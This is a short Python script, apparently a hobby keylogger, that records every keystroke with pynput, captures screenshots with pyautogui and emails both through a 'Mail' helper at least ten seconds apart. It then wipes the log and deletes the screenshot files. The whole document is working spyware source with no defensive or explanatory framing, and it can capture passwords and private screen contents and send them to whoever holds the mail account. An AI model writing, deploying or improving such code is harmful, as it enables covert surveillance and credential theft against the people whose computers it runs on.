from mail import Mail
from datetime import datetime
import time
import logging
from pynput.keyboard import Key, Listener
import pyautogui
import os


mail = Mail()
t1 = datetime.fromtimestamp(time.time())
print(t1)
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s") 

def on_press(key):
    logging.info(str(key))
    global t1
    t2 = datetime.fromtimestamp(time.time())
    diff_time = t2 - t1


    if  (diff_time.total_seconds() > 10): 
            mail.send('keylog.txt')
            t1 = datetime.fromtimestamp(time.time())
            screenshot = pyautogui.screenshot()
            screenshot.save(r'/home/clementine/Desktop/logger/{}.png'.format(t2))
            mail.send('/home/clementine/Desktop/logger/{}.png'.format(t2))
            open('keylog.txt', 'w').close()
            os.remove('/home/clementine/Desktop/logger/{}.png'.format(t2))

with Listener(on_press=on_press) as listener :
    listener.join()